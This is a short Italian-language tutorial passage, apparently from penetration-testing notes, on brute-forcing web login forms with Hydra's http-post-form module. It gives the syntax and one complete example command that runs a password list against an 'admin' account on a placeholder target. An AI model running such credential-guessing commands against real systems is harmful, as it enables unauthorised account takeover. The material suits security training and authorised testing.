# 🌐 Attacchi ai Web Form con Hydra (HTTP-POST)

L'attacco ai moduli di login web è complesso perché Hydra deve simulare esattamente ciò che fa un browser quando premi "Login".

## 1. Anatomia del comando HTTP-POST-FORM
La sintassi segue questo schema rigido:
`"<path>:<request_body>:<condition>"`

### Esempio Pratico:
```bash
hydra -l admin -P passlist.txt [IP_TARGET] http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect" -V
